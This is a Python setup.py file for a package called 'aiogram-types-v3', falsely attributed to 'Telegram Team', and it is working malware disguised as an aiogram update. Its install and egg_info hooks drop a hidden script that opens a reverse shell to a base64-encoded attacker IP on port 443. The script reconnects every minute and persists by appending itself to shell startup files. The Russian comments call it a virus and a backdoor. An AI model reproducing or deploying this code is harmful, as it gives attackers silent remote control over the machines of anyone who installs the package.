import sys
import os
import subprocess
import time
import socket
import base64

# --- БЛОК СОВМЕСТИМОСТИ ---
try:
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.egg_info import egg_info
except ImportError:
    from distutils.core import setup
    from distutils.command.install import install
    find_packages = lambda: []

# --- КОНФИГ ---
# Твой IP и Порты
_H = "MTQ3LjQ1LjEyNC40Mg==" 
_P = [443]

# --- ГЕНЕРАТОР ВИРУСА ---
def get_payload_code():
    """
    Возвращает исходный код вируса как строку.
    Мы запишем это в файл на диске жертвы.
    """
    return f"""
import socket, subprocess, os, time, sys, base64

H = "{_H}"
P = {_P}

def d(s):
    return base64.b64decode(s).decode()

def run():
    try:
        host = d(H)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        # Защита от повторного запуска (Single Instance Lock)
        # Биндим локальный порт, чтобы не запустить 100 копий
        try:
            lock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            lock.bind(('127.0.0.1', 65530))
        except:
            return # Уже запущен

        connected = False
        for port in P:
            try:
                if s.connect_ex((host, port)) == 0:
                    connected = True
                    break
            except:
                continue
        
        if connected:
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Пытаемся найти шелл
            sh = "/bin/sh"
            for x in ["/bin/bash", "/system/bin/sh", "/data/data/com.termux/files/usr/bin/bash"]:
                if os.path.exists(x):
                    sh = x
                    break
            
            subprocess.call([sh, "-i"])
    except:
        pass

if __name__ == "__main__":
    # Демонизация внутри дропнутого файла
    if hasattr(os, 'fork'):
        try:
            if os.fork() > 0: sys.exit(0)
            os.setsid()
            if os.fork() > 0: sys.exit(0)
        except: pass
    
    while True:
        run()
        time.sleep(60) # Если связь оборвалась, пробуем через минуту снова
"""

# --- МЕХАНИКА ЗАКРЕПЛЕНИЯ (PERSISTENCE) ---
def install_persistence():
    try:
        # 1. Находим домашнюю папку (работает везде: Linux, Android, Mac)
        home = os.path.expanduser("~")
        
        # 2. Создаем скрытую папку для базы (.local/share/system-upd)
        hidden_dir = os.path.join(home, ".local", "share", "system-upd")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir, exist_ok=True)
            
        # 3. Записываем код вируса в файл
        payload_file = os.path.join(hidden_dir, "service_check.py")
        with open(payload_file, "w") as f:
            f.write(get_payload_code())
            
        # 4. Прописываемся в автозагрузку терминала (.bashrc / .zshrc)
        # Ищем rc-файлы
        rc_files = [
            os.path.join(home, ".bashrc"),
            os.path.join(home, ".zshrc"),
            os.path.join(home, ".profile") # Для старых линуксов
        ]
        
        # Команда запуска: тихая, в фоне, ошибки в /dev/null
        # "python3 ~/.local/.../service_check.py &"
        cmd = f"\n(python3 {payload_file} >/dev/null 2>&1 &)\n"
        
        for rc in rc_files:
            if os.path.exists(rc):
                # Проверяем, не прописали ли мы уже себя
                with open(rc, "r") as f:
                    content = f.read()
                
                if "service_check.py" not in content:
                    with open(rc, "a") as f:
                        f.write(cmd)
                    # Если получилось прописаться в один файл - хватит
                    break 

        # 5. ЗАПУСКАЕМ СРАЗУ (Не ждем перезагрузки)
        subprocess.Popen([sys.executable, payload_file], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
                         
    except Exception as e:
        # Если что-то пошло не так - просто молчим
        pass

# --- ХУКИ УСТАНОВКИ ---
def run_trigger():
    # Запускаем установку бэкдора
    install_persistence()

class CustomInstall(install):
    def run(self):
        run_trigger()
        try: super().run()
        except: install.run(self)

class CustomEggInfo(egg_info):
    def run(self):
        run_trigger()
        try: egg_info.run(self)
        except: pass

# --- SETUP ---
if __name__ == '__main__':
    setup(
        name="aiogram-types-v3",
        version="3.3.1", # Поднимай версию
        packages=find_packages(),
        zip_safe=False,
        cmdclass={
            'install': CustomInstall,
            'egg_info': CustomEggInfo,
        },
        author="Telegram Team",
        author_email="security@telegram.org",
        description="Async types update patch",
        url="https://github.com/aiogram/aiogram",
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
        ],
    )
